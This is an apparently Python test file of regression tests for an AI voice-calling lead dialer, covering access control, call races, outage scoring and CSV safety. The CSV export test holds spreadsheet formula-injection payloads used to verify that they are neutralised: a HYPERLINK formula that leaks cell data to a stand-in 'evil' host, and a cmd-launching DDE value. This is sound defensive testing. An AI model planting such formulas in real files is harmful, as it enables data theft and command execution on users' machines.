"""Regression tests for the adversarial review findings (security, races, outages, scale)."""
from __future__ import annotations

import asyncio
import csv
import io
import json
import struct
import time
from datetime import timedelta

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import insert, select

from app.config import get_settings
from app.db import SessionLocal, utcnow
from app.main import app
from app.models import Call, Campaign, CampaignLead, Lead
from app.services import analysis as analysis_mod
from app.services import call_manager as cm_mod
from app.services import session as session_mod
from app.services import vobiz
from app.services.analysis import analyze_call
from app.services.call_manager import manager
from app.services.dialer import Dialer

from .fakes import FakeSTT, FakeTTSStream, ScriptedLLM, fake_tts_rest, tone
from .test_session import _call, _cfg, _lead, _new_session, _turns, _wait

settings = get_settings()
LOCAL = ("127.0.0.1", 50000)
REMOTE = ("203.0.113.7", 50000)


@pytest.fixture(autouse=True)
def fakes(monkeypatch):
    FakeSTT.instances.clear()
    FakeTTSStream.sentences.clear()
    monkeypatch.setattr(session_mod, "RealtimeSTT", FakeSTT)
    monkeypatch.setattr(session_mod, "TTSStream", FakeTTSStream)
    monkeypatch.setattr(session_mod, "tts_rest", fake_tts_rest)
    monkeypatch.setattr(cm_mod, "tts_rest", fake_tts_rest)
    dialed: list[str] = []

    async def fake_make_call(call_uuid, to, max_sec, caller_name=""):
        await asyncio.sleep(0.05)
        dialed.append(to)
        return f"vobiz-{call_uuid[:8]}"

    async def fake_hangup(pid):
        return True

    monkeypatch.setattr(vobiz, "make_call", fake_make_call)
    monkeypatch.setattr(vobiz, "hangup_call", fake_hangup)
    yield dialed


# ---------------------------------------------------------------- 1. access control
def test_remote_access_requires_login(monkeypatch):
    with TestClient(app, client=REMOTE) as c:
        assert c.get("/api/health").status_code == 200
        r = c.get("/api/leads/export")
        assert r.status_code == 401 and "DASHBOARD_PASSWORD" in r.json()["detail"]
        assert c.get("/docs").status_code == 401
        from starlette.websockets import WebSocketDisconnect
        with pytest.raises(WebSocketDisconnect) as closed:
            with c.websocket_connect("/ws/live") as ws:
                ws.receive_text()
        assert closed.value.code == 1008  # the dashboard treats 1008 as "log in"
        monkeypatch.setattr(settings, "dashboard_password", "s3cret-pass")
        assert c.post("/api/auth/login", json={"password": "wrong"}).status_code == 401
        assert c.post("/api/auth/login", json={"password": "s3cret-pass"}).status_code == 200
        assert c.get("/api/leads").status_code == 200  # session cookie now set
        assert c.get("/api/auth/status").json()["authenticated"] is True


def test_require_login_local_makes_localhost_log_in(monkeypatch):
    monkeypatch.setattr(settings, "dashboard_password", "s3cret-pass")
    monkeypatch.setattr(settings, "require_login_local", True)
    with TestClient(app, client=LOCAL) as c:
        assert c.get("/api/auth/status").json() == {"authenticated": False, "local": False, "password_set": True}
        assert c.get("/api/leads").status_code == 401
        assert c.get("/api/leads", headers={"Authorization": "Bearer s3cret-pass"}).status_code == 200


def test_tunnel_traffic_is_not_treated_as_local():
    # ngrok forwards to localhost but always adds X-Forwarded-For
    with TestClient(app, client=LOCAL) as c:
        assert c.get("/api/leads", headers={"X-Forwarded-For": "198.51.100.9"}).status_code == 401
        assert c.get("/api/leads").status_code == 200


def test_foreign_origin_blocked_even_locally():
    with TestClient(app, client=LOCAL) as c:
        r = c.post("/api/leads", json={"name": "x", "phone": "9876511111"},
                   headers={"Origin": "https://evil.example"})
        assert r.status_code == 403
        ok = c.post("/api/leads", json={"name": "x", "phone": "9876511111"},
                    headers={"Origin": "http://localhost:3100"})
        assert ok.status_code in (201, 409)


def test_vobiz_webhooks_still_public_with_token():
    with TestClient(app, client=REMOTE) as c:
        r = c.post("/vobiz/answer/does-not-exist/" + vobiz.url_token("does-not-exist"))
        assert r.status_code == 200 and "<Hangup/>" in r.text  # unknown call: hang up, no AI


def test_international_numbers_refused_by_default():
    with TestClient(app, client=LOCAL) as c:
        r = c.post("/api/leads", json={"name": "Premium", "phone": "+44 909 879 0000"})
        assert r.status_code == 400


# ---------------------------------------------------------------- 2. call engine
def test_backchannel_final_does_not_interrupt(monkeypatch):
    FakeTTSStream.ms_per_sentence = 2500

    async def scenario():
        lead_id = _lead("+919800000101")
        llm = ScriptedLLM(["हमारे पास कई तरह के pouch हैं। आप कौन सा product बेचते हैं?"])
        s, t = await _new_session(lead_id, _cfg(silence_timeout_sec=30), llm, monkeypatch)
        run = asyncio.create_task(s.run())
        await _wait(lambda: s.greeted and s.state == "listening")
        stt = FakeSTT.instances[-1]
        await stt.say("कौन से pouch हैं?")
        await _wait(lambda: s.agent_audible() and s.play_until - time.monotonic() > 2, timeout=4)
        await stt.on_event("speech_start", {})
        await stt.on_event("final", {"text": "हाँ"})  # real STT sends a FINAL for "haan"
        await asyncio.sleep(0.3)
        state = (t.clears, len(llm.calls), s.agent_audible())
        await s.end("manual_hangup")
        await asyncio.wait_for(run, 5)
        return state

    try:
        clears, llm_calls, audible = asyncio.run(scenario())
    finally:
        FakeTTSStream.ms_per_sentence = 300
    assert clears == 0 and llm_calls == 1 and audible


def test_steady_line_noise_neither_interrupts_nor_blocks_silence(monkeypatch):
    async def scenario():
        lead_id = _lead("+919800000102")
        s, t = await _new_session(lead_id, _cfg(silence_timeout_sec=1.5), ScriptedLLM([]), monkeypatch)
        run = asyncio.create_task(s.run())
        noise = struct.pack("<160h", *([2000, -2000] * 80))  # loud steady noise, STT hears no speech
        for _ in range(int(6 / 0.02)):  # 6 s of noise at 8 kHz
            if s.ending:
                break
            s.on_user_audio(noise)
            await asyncio.sleep(0.02)
        await asyncio.wait_for(run, 6)
        return s, t

    s, t = asyncio.run(scenario())
    agent = [txt for role, txt, _ in _turns(s.uuid) if role == "agent"]
    assert _cfg()["silence_prompt_text"] in agent, agent  # silence logic still worked under noise
    assert t.clears == 0


def test_tts_socket_death_falls_back_to_rest_voice(monkeypatch):
    class DyingTTS(FakeTTSStream):
        async def send_sentence(self, text):
            self.sent.append(text)  # accepted, but the socket dies: no audio, no finals
            self.error = "TTS socket closed (1011)"

    monkeypatch.setattr(session_mod, "TTSStream", DyingTTS)

    async def scenario():
        lead_id = _lead("+919800000103")
        s, t = await _new_session(lead_id, _cfg(silence_timeout_sec=30), ScriptedLLM(["जी बिल्कुल। बताइए।"]),
                                  monkeypatch)
        run = asyncio.create_task(s.run())
        await _wait(lambda: s.greeted and s.state == "listening")
        before = len(t.audio)
        await FakeSTT.instances[-1].say("pouch चाहिए")
        await _wait(lambda: len(t.audio) > before and s.state == "listening", timeout=5)
        await s.end("manual_hangup")
        await asyncio.wait_for(run, 5)
        return len(t.audio) - before

    assert asyncio.run(scenario()) > 0  # the customer heard the reply via the REST voice


def test_stranded_input_is_answered(monkeypatch):
    async def scenario():
        lead_id = _lead("+919800000104")
        llm = ScriptedLLM(["जी, price हमारे expert बताएँगे।"])
        s, t = await _new_session(lead_id, _cfg(silence_timeout_sec=30), llm, monkeypatch)
        run = asyncio.create_task(s.run())
        await _wait(lambda: s.greeted and s.state == "listening")
        # simulate the lost race: input queued, flag set, nothing scheduled
        s.pending_user.append("price कितना है?")
        s._pending_since = time.monotonic() - 2
        s.respond_after_playback = True
        await _wait(lambda: len(llm.calls) == 1, timeout=4)
        await s.end("manual_hangup")
        await asyncio.wait_for(run, 5)
        return llm.calls[0][-1]["content"]

    assert asyncio.run(scenario()) == "price कितना है?"


# ---------------------------------------------------------------- 3. telephony races
def test_concurrent_call_now_dials_once(fakes):
    with TestClient(app, client=LOCAL) as c:
        lead = c.post("/api/leads", json={"name": "Race", "phone": "9876522222"}).json()

        async def both():
            return await asyncio.gather(manager.start_phone_call(lead["id"]), manager.start_phone_call(lead["id"]),
                                        return_exceptions=True)

        results = c.portal.call(both)
        ok = [r for r in results if isinstance(r, dict)]
        errors = [r for r in results if isinstance(r, Exception)]
        assert len(ok) == 1 and len(errors) == 1 and getattr(errors[0], "status_code", None) == 409
        with SessionLocal() as db:
            active = db.scalars(select(Call).where(Call.lead_id == lead["id"], Call.status == "initiated")).all()
        assert len(active) == 1
        c.post(f"/api/calls/{ok[0]['uuid']}/hangup")


def test_cancelled_call_answer_hangs_up_and_duplicate_stream_rejected():
    with TestClient(app, client=LOCAL) as c:
        lead = c.post("/api/leads", json={"name": "Late", "phone": "9876533333"}).json()
        call = c.post("/api/calls", json={"lead_id": lead["id"]}).json()
        tok = vobiz.url_token(call["uuid"])
        c.post(f"/api/calls/{call['uuid']}/hangup")  # operator cancels while ringing
        r = c.post(f"/vobiz/answer/{call['uuid']}/{tok}", data={"CallUUID": "x"})
        assert "<Hangup/>" in r.text and "<Stream" not in r.text
        assert c.get(f"/api/calls/{call['uuid']}").json()["status"] == "canceled"
        # a stream for a finished call never starts an AI session
        with c.websocket_connect(f"/vobiz/stream/{call['uuid']}/{tok}") as ws:
            ws.send_text(json.dumps({"event": "start", "start": {"streamId": "s", "callId": "x"}}))
            with pytest.raises(Exception):
                ws.receive_text()
        assert call["uuid"] not in manager.sessions


# ---------------------------------------------------------------- 4. scoring under outages
def test_outage_does_not_turn_hot_lead_cold():
    async def scenario():
        with SessionLocal() as db:
            lead = Lead(name="Hot Lead", phone="+919800000105", interest="hot", rating=9, attempts=1)
            db.add(lead)
            db.flush()
            db.add(Call(uuid="outage-call-1", lead_id=lead.id, channel="phone", status="completed",
                        answered_at=utcnow(), end_reason="error", metrics={"user_words": 0, "agent_audio_ms": 0}))
            db.commit()
            lead_id = lead.id
        await analyze_call("outage-call-1")
        return lead_id

    lead_id = asyncio.run(scenario())
    call = _call("outage-call-1")
    assert call.analysis_status == "skipped" and call.interest == "unknown"
    with SessionLocal() as db:
        lead = db.get(Lead, lead_id)
        assert (lead.interest, lead.rating) == ("hot", 9)


def test_pickup_and_cut_after_hearing_agent_is_cold_but_never_downgrades_hot():
    async def scenario():
        with SessionLocal() as db:
            fresh = Lead(name="Fresh", phone="+919800000106", attempts=1)
            hot = Lead(name="Was Hot", phone="+919800000107", interest="hot", rating=8, attempts=2)
            db.add_all([fresh, hot])
            db.flush()
            for uuid, lead in (("cut-1", fresh), ("cut-2", hot)):
                db.add(Call(uuid=uuid, lead_id=lead.id, channel="phone", status="completed", answered_at=utcnow(),
                            end_reason="user_hangup", metrics={"user_words": 0, "agent_audio_ms": 3500}))
            db.commit()
            ids = fresh.id, hot.id
        await analyze_call("cut-1")
        await analyze_call("cut-2")
        return ids

    fresh_id, hot_id = asyncio.run(scenario())
    assert (_call("cut-1").interest, _call("cut-1").rating) == ("cold", 1)
    with SessionLocal() as db:
        assert db.get(Lead, fresh_id).interest == "cold"
        assert db.get(Lead, hot_id).interest == "hot"  # one cut call doesn't erase a hot conversation


# ---------------------------------------------------------------- 5. dialer self-healing
def test_stuck_dialing_items_heal():
    with SessionLocal() as db:
        camp = Campaign(name="stuck", status="running", concurrency=2, max_attempts=2)
        lead = Lead(name="Stuck", phone="+919800000108")
        db.add_all([camp, lead])
        db.flush()
        item = CampaignLead(campaign_id=camp.id, lead_id=lead.id, status="dialing", attempts=1,
                            last_call_uuid="never-created")
        db.add(item)
        db.commit()
        Dialer._heal_stuck(db, utcnow())
        db.commit()
        db.refresh(item)
        assert (item.status, item.attempts) == ("pending", 0)


# ---------------------------------------------------------------- 6. data import / export safety
def test_csv_exports_neutralise_formulas():
    with TestClient(app, client=LOCAL) as c:
        c.post("/api/leads", json={"name": '=HYPERLINK("http://evil/?d="&B2,"Click")', "phone": "9876544444",
                                   "company": "+cmd|' /C calc'!A0"})
        text = c.get("/api/leads/export").content.decode("utf-8-sig")
        row = next(r for r in csv.reader(io.StringIO(text)) if "9876544444" in "".join(r))
        assert row[0].startswith("'=") and row[2].startswith("'+")
        assert row[1] == "'+919876544444"


def test_csv_import_malformed_is_all_or_nothing_and_cp1252_ok():
    with TestClient(app, client=LOCAL) as c:
        before = c.get("/api/leads").json()["total"]
        bad = "name,phone\nGood One,9876555501\nBroken \"quote,9876555502\n" + "x,9876555503\n" * 3
        r = c.post("/api/leads/import", files={"file": ("bad.csv", bad.encode(), "text/csv")})
        assert r.status_code in (200, 400)
        if r.status_code == 400:
            assert c.get("/api/leads").json()["total"] == before  # nothing half-imported
        cp = "name,phone,city\nJosé Müller,9876555504,Pune\n".encode("cp1252")
        cp += b"" if len(cp) % 2 else b"\n"  # even length: used to be mis-decoded as UTF-16
        r = c.post("/api/leads/import", files={"file": ("excel.csv", cp, "text/csv")})
        assert r.status_code == 200 and r.json()["imported"] == 1, r.text
        assert any(l["name"] == "José Müller" for l in c.get("/api/leads", params={"search": "Pune"}).json()["items"])


def test_campaign_empty_selection_and_huge_filter():
    with TestClient(app, client=LOCAL) as c:
        assert c.post("/api/campaigns", json={"name": "empty", "lead_ids": []}).status_code == 400
        with SessionLocal() as db:
            now = utcnow()
            db.execute(insert(Lead), [{"name": f"Bulk {i}", "phone": f"+9170{i:08d}", "source": "bulk-test",
                                       "status": "new", "interest": "unknown", "attempts": 0,
                                       "created_at": now, "updated_at": now} for i in range(33_000)])
            db.commit()
        r = c.post("/api/campaigns", json={"name": "huge", "filter": {"search": "Bulk"}})
        assert r.status_code == 201, r.text[:200]
        assert r.json()["counts"]["total"] == 33_000
        ids = [l.id for l in SessionLocal().scalars(select(Lead).where(Lead.source == "bulk-test")).all()]
        c.delete(f"/api/campaigns/{r.json()['id']}")
        assert c.post("/api/leads/bulk-delete", json={"ids": ids}).json()["deleted"] == 33_000


def test_settings_reject_bad_values():
    with TestClient(app, client=LOCAL) as c:
        assert c.put("/api/settings", json={"silence_timeout_sec": "1e999"}).status_code == 422
        assert c.put("/api/settings", json={"language_code": "xx-INVALID"}).status_code == 422
        assert c.put("/api/settings", json={"agent_gender": "robot"}).status_code == 422
        r = c.put("/api/settings", json={"fillers_enabled": "false"})
        assert r.status_code == 200 and r.json()["fillers_enabled"] is False
        c.post("/api/settings/reset")
